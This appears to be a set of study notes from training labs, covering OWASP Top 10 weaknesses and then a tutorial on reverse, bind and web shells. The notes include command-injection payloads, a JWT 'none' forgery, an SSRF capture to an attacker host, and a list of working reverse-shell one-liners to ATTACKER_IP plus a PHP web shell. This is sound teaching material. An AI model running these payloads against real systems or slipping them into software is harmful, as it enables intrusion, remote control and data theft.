- **Data at rest:** Server-side encryption of stored data (e.g., emails on the provider's servers).

---
### SQLite example (flat-file DB access)
If a flat-file DB (e.g., SQLite) sits inside webroot and is downloadable, an attacker can retrieve it and query locally. Example commands and interactions:

```bash
$ ls -l
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
$ file example.db
example.db: SQLite 3.x database, UTF-8

# Open DB
$ sqlite3 example.db
sqlite> .tables
customers

# Show schema + dump
sqlite> PRAGMA table_info(customers);
sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
...
```
Columns: `custID`, `custName`, `creditCard`, `password` (hash).

**Risk:** Database leak = full access to stored sensitive records.

**Mitigations:**
- Never store DB files under webroot
- Apply filesystem permissions and access controls
- Use dedicated DB servers and restrict access

---
### Cracking weak MD5 hashes (CrackStation)
- Weak hashes (e.g., MD5 of common passwords) are trivially cracked via large rainbow/wordlist databases.
- Example: `5f4dcc3b5aa765d61d8327deb882cf99` → `password` (common MD5 for "password").
- Tools: CrackStation (web), Hashcat, John the Ripper (local/offline).

**Mitigations:**
- Use strong password hashing: Argon2, bcrypt, scrypt, PBKDF2 with salts
- Enforce strong password policies and MFA
- Monitor for leaked hashes and require resets on exposure

---

## Injection
**Overview:** Injection occurs when untrusted input is interpreted as code/commands by the server (SQL, OS commands, LDAP, XML, etc.).

### SQL Injection (SQLi)
**Impact:** Read/modify/delete data, bypass auth, remote code execution in some stacks.

**Prevention:**
- Use parameterized queries / prepared statements
- Use ORM safely and avoid dynamic SQL string concatenation
- Validate and sanitize inputs, prefer allow-lists

### Command Injection
**Description:** When user input is sent to OS commands (e.g., via `system()`, `exec()`, `passthru()`), attackers can run arbitrary commands.

#### PHP `passthru()` example
Vulnerable PHP snippet:
```php
<?php
if (isset($_GET["mooing"])) {
    $mooing = $_GET["mooing"];
    $cow = 'default';

    if(isset($_GET["cow"]))
        $cow = $_GET["cow"];
    
    passthru("perl /usr/bin/cowsay -f $cow $mooing");
}
?>
```
**Why vulnerable:** `$cow` and `$mooing` are concatenated into a shell command without sanitization. An attacker can inject inline commands like `$(whoami)` (or use `;`, `&&`, backticks depending on shell) to execute arbitrary commands.

**Example payloads to test:** `$(whoami)`, `$(id)`, `$(uname -a)`, `$(ifconfig)`

**Mitigations:**
- Avoid invoking shells with untrusted input
- Use safe APIs (no shell interpretation) or properly escape input
- Validate/allow-list expected values (e.g., specific cow names)
- Run services with least privilege

---

## Insecure Design
**Definition:** Architectural or design-level weaknesses introduced early in the SDLC, typically from missing threat modelling. They require changes to design rather than quick code fixes.

**Examples:** disabling security features in dev and shipping to prod, weak OTP schemes, improper rate-limiting design that can be abused via distributed IPs.

### Insecure Password Resets
**Case study (conceptual):** Instagram used 6-digit SMS codes. Rate-limiting applied per-IP only, allowing distributed attack from many IPs to brute-force the 6-digit code. Attackers can use cloud IPs to parallelize attempts.

**Mitigations:**
- Rate limit per-account and implement progressive throttling
- Use device/fingerprint and anomaly detection
- Use multi-factor authentication and short expiry codes
- Ensure reset flows include out-of-band confirmation

**Prevention:** Threat-model during design, secure development lifecycle (SSDLC), and defensive patterns from the start.

---

## Security Misconfiguration
**What it is:** Defaults, unnecessary features, open cloud buckets, verbose error messages, exposed admin/debug endpoints, missing HTTP security headers, etc.

**Common issues:**
- Default credentials left unchanged
- Exposed admin panels or debug consoles
- Overly verbose error messages leaking stack traces or config
- Missing Content-Security-Policy, X-Frame-Options, Strict-Transport-Security

### Debugging Interfaces
**Danger:** Framework debug consoles (e.g., Werkzeug console in Python) may allow arbitrary code execution if exposed in production. Patreon hack (2015) demonstrates real-world impact when debug consoles are accessible.

**Mitigations:**
- Ensure debug features are disabled in production
- Harden admin/debug endpoints (auth, allow-list IPs)
- Remove dev tooling and test endpoints before deployment

---

## Vulnerable and Outdated Components
**Issue:** Using known vulnerable versions (CMS, libs, web servers) with public exploits leads to trivial compromise if not patched.

**Example flow:**
1. Find version (banner, headers, `robots.txt`, files)
2. Search Exploit-DB or vendor advisories for known exploits
3. Use or adapt exploit script (may require small fixes)

### Nostromo 1.9.6 — CVE-2019-16278 example
- Found default Nostromo page and version `1.9.6`
- Found exploit on Exploit-DB (script 47837.py), minor edit required (comment out an offending line)
- Running exploit returned `uid=1001(_nostromo) ...` — Remote Code Execution (RCE)

**Mitigations:**
- Maintain an inventory of software and versions
- Patch/update components; remove unused features
- Subscribe to security advisories and perform scheduled upgrades

---

## Authentication & Session Management
**Purpose:** Identify users (auth) and maintain state via sessions (cookies/tokens). Weaknesses here allow account takeover and session fixation.

**Common issues:**
- Weak password policies → brute force
- No lockout or weak rate-limiting
- Predictable session cookies or tokens
- Missing MFA

**Mitigations:**
- Enforce strong password rules and MFA
- Implement account lockout / progressive delays
- Use secure, random, and signed session tokens (HttpOnly, Secure flags)
- Proper logout/invalidation of tokens/sessions

### Re-registration logic flaw example
**Scenario:** Registering a username with a leading/trailing whitespace (`" admin"`) creates a separate account that may inherit or collide with an existing user's privileges or expose that user's content. Example: registering `" darren"` logged in and accessed `darren`'s content.

**Mitigations:**
- Normalize and validate usernames (trim whitespace, canonicalize)
- Enforce uniqueness checks and canonical comparisons
- Sanity-check registration flows and tests for edge cases

---

## Identification & Cryptographic Integrity
**Integrity definition:** Ensuring data hasn't been tampered with. Hashes/digests allow verification of file integrity after download (e.g., `md5sum`, `sha256sum`).

**Example — verifying WinSCP installer:**
```bash
$ md5sum WinSCP-5.21.5-Setup.exe
$ sha1sum WinSCP-5.21.5-Setup.exe
$ sha256sum WinSCP-5.21.5-Setup.exe
```
If computed values match published hashes → file integrity preserved.

### Software Integrity Failures (SRI)
**Problem:** Including third-party JS without integrity checks allows supply-chain compromise. Example:
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```
**Fix (Subresource Integrity):**
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"
  integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
  crossorigin="anonymous"></script>
```
Use SRI hashes (generate via tools like https://www.srihash.org/).

### Data Integrity Failures (JWT `none` algorithm attack)
**Background:** JWTs have three base64 parts: `header.payload.signature`. Some vulnerable libraries allowed `alg: none` in header and skipped signature verification if signature omitted.
**Attack:** Modify header to `{"alg":"none"}` and change payload (e.g., `username: "admin"`), then remove signature. Vulnerable implementations accept the token — severe integrity bypass.
**Mitigations:**
- Use well-maintained JWT libraries
- Reject tokens with `alg: none` or explicitly validate allowed algorithms
- Enforce server-side session checks where appropriate

---

## Logging & Monitoring
**Why it matters:** Logs are key to detect incidents and perform forensics. Without them, breaches may go undetected and cause regulatory, operational, and reputational harm.

**Useful log fields:**
- Timestamps
- HTTP status codes
- Usernames / account identifiers
- Endpoints requested (URI)
- Source IP addresses
- Any authorization decision outcomes

**Monitoring & detection tips:**
- Alert on high-impact suspicious events (e.g., repeated auth failures, admin access from new IP)
- Rate events by severity and tune alerts to reduce noise
- Store logs securely and retain copies for forensic analysis

---

## Server-Side Request Forgery (SSRF)
**What it is:** A web app can be tricked into making requests on behalf of an attacker to arbitrary destinations. Often arises when the app accepts a URL/host to fetch third-party resources.

**Simple example:** An app takes `server` and `msg` and issues a request to the configured SMS provider:
```
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```
The app forwards request to attacker-controlled `attacker.thm`, leaking API keys and payloads (attacker captures via `nc -lvp 80`).

**What SSRF enables:**
- Internal network enumeration (metadata, internal services)
- Abuse trust relationships, access internal admin interfaces
- Interact with non-HTTP services (Redis, memcached) that may lead to RCE

**Mitigations:**
- Do not fetch arbitrary user-supplied URLs/hosts
- Resolve and allow-list external domains or block private IP ranges
- Validate and sanitize URL inputs, employ egress filtering

---

## References & Further Reading
- OWASP Top 10 (2021)
- TryHackMe rooms (OWASP Top 10, SSDLC, etc.)
- Exploit-DB
- CrackStation (hash cracking)
- SRI docs and JWT libraries (official docs)

# Shells Overview

## Introduction
Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain. In this room, we'll explore different shells used in offensive security, the differences between them, and their use cases. This knowledge can help enhance penetration testing and exploitation skills and also help us understand how to detect when a remote shell is being used by an attacker within an organization.

## What is a Shell?
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
- **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot. This is also known as *pivoting*.

## Reverse Shell
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

### How Reverse Shells Work
**Set up a Netcat (nc) Listener**

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

- `-l`: listen for a connection  
- `-v`: verbose mode  
- `-n`: no DNS resolution  
- `-p`: specify port  

Common ports used: 53, 80, 8080, 443, 139, 445 (to blend with legitimate traffic).

### Example Reverse Shell Payload (Pipe Reverse Shell)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Explanation:**
- `rm -f /tmp/f`: remove old pipe if exists  
- `mkfifo /tmp/f`: create named pipe  
- `cat /tmp/f`: read input from pipe  
- `| bash -i 2>&1`: pipe to interactive shell  
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: connect to attacker and redirect I/O  

### Attacker Receives the Shell
```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964

target@tryhackme:~$
```

---

## Bind Shell
A bind shell binds a port on the compromised system and listens for a connection. Once connected, it exposes a shell session to the attacker.

### Example Bind Shell Payload
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Attacker connects with:
```bash
nc -nv TARGET_IP 8080
```

---

## Tools for Listeners

### Rlwrap
```bash
rlwrap nc -lvnp 443
```

### Ncat
```bash
ncat -lvnp 4444
ncat --ssl -lvnp 4444
```

### Socat
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

---

## Shell Payloads

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

### Python
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("bash")'
```

### Others
- **Telnet**
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
- **AWK**
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42){ ... }}' /dev/null
```
- **BusyBox**
```bash
busybox nc ATTACKER_IP 443 -e sh
```

---

## Web Shells

Web shells are scripts uploaded to web servers (PHP, ASP, JSP, CGI). They allow command execution through HTTP requests.

### Example PHP Web Shell
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Access:  
`http://victim.com/uploads/shell.php?cmd=whoami`

### Popular Web Shells
- **p0wny-shell** – minimalistic single-file PHP web shell  
- **b374k shell** – feature-rich PHP web shell with file management  
- **c99 shell** – robust PHP web shell with extensive functionality  

More: [r57shell.net](https://www.r57shell.net/index.php)

---

## Conclusion
We learned about **Reverse Shells**, **Bind Shells**, and **Web Shells**—their use in offensive security, detection, and defense.  
- Reverse Shells: connect back to attacker  
- Bind Shells: listen for incoming connection  
- Web Shells: abuse web servers for command execution  

Understanding shells is critical for security professionals to perform penetration testing and defend systems.

---
